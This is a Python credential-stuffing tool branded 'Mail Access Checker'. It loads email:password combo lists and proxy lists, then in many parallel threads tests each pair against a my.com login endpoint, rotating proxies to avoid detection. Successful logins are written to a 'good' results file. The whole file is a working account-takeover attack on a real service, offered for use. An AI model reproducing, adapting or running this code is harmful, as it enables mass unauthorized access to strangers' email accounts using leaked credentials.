import requests, threading, os, sys, time, random, os.path
from colorama import Fore, init

passwords, emails = [], []
proxy = []

bad, good, checked, cpm1, cpm2, error = 0, 0, 0, 0, 0, 0

os.system('title Mail Access Checker - By AmineMrx')

logo = """   
    ____           ______     __                           ____           
   / __ )__  __   / ____/  __/ /_________  ____ ___  ___  / __ \___ _   __
  / __  / / / /  / __/ | |/_/ __/ ___/ _ \/ __ `__ \/ _ \/ / / / _ \ | / /
 / /_/ / /_/ /  / /____>  </ /_/ /  /  __/ / / / / /  __/ /_/ /  __/ |/ / 
/_____/\__, /  /_____/_/|_|\__/_/   \___/_/ /_/ /_/\___/_____/\___/|___/  
      /____/                                                              """

if not os.path.exists("result"):
    os.makedirs("result")
if not os.path.exists("proxies.txt"):
    with open("proxies.txt", "a+") as e:
        e.close()
        os.system('cls')
        print("\n{}\n".format(logo))
        print("Please add proxies into proxies.txt")
        print()
        input("Press any key after you done it..")
if not os.path.exists("combos.txt"):
    with open("combos.txt", "a+") as e:
        e.close()
        os.system('cls')
        print("\n{}\n".format(logo))
        print("Please add combos into combos.txt")
        print()
        input("Press any key after you done it..")

def load_accs():
    try:
        with open("combos.txt", "r+", encoding='utf-8') as s:
            sx = s.readlines()
            for x in sx:
                try:
                    email, password = x.split(":")[0].replace('\n', ''), x.split(":")[1].replace('\n', '')
                    emails.append(email)
                    passwords.append(password)
                except:
                    pass
    except:
        print("Please Create A File Named: 'proxies.com'")
        time.sleep(2)
        sys.exit()

def screen():
    global cpm1, cpm2, good, bad, checked, error, emails
    os.system('cls')
    cpm2 = cpm1
    cpm1 = 0
    print("\n{}\n".format(logo))
    print("Checking Mail Access Accounts..\nChecked: [{}/{}]\nGood: [{}]\nBad: [{}]\nCPM: [{}]\nErrors: [{}]".format(checked, len(emails), good, bad, cpm2*60, error))
    time.sleep(1)
    threading.Thread(target=screen, args=()).start()
def load_prx():
    try:
        with open('proxies.txt', 'r+', encoding='utf-8') as x1:
            sx = x1.readlines()
            for x in sx:
                try:
                    line = x.split()[0].replace('\n', '')
                    proxy.append(line)
                except:
                    pass
    except:
        print("Please Create A File Named: 'proxies.com'")
        time.sleep(2)
        sys.exit()

def main():
    os.system('cls')
    print(f"\n{logo}\n")
    print("If you want to start checking press Enter")
    input()

def check(email, password, proxy):
    global cpm1, cpm2, good, bad, checked, error, emails
    try:
        sess = requests.Session()
        os.system('title Checking: {}:{}'.format(email, password))
        proxys = random.choice(proxy)
        proxy_for_check = {'http': f'http://{proxys}', 'https': f'https://{proxys}'}
        sess.proxies = proxy_for_check
        url = "https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={}&Password={}".format(email, password)
        headers = {
            "User-Agent": "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0" 
        }
        f = sess.get(url, headers=headers)
        if "Ok=0" in f.text:
            bad+=1
            checked+=1
            cpm1+=1
            open('result/bad.txt', 'a+').write('{}:{}'.format(email, password))
        elif "Ok=1" in f.text:
            good+=1
            checked+=1
            cpm1+=1
            open('result/good.txt', 'a+').write('{}:{}'.format(email, password))
        else:
            threading.Thread(target=check, args=(email, password, proxy,)).start()
    except Exception:
        error+=1
    
load_accs()
load_prx()
main()

os.system('cls')
print("\n{}\n".format(logo))
print("How many threads do you want to use")
try:
    threads_number = int(input(""))
except KeyError:
    print("Please Use A Number..")
    time.sleep(2)
    main()
except:
    print("Error ocurred, try again..")
    time.sleep(2)
    main()



extremedev = "skid" 
if extremedev == "skid":
    screen()
    check_number = 0
    while 1:
        if threading.active_count() < int(threads_number):
            if check_number < len(emails):
                threading.Thread(target=check, args=(emails[check_number], passwords[check_number], proxy,)).start()
                check_number+=1
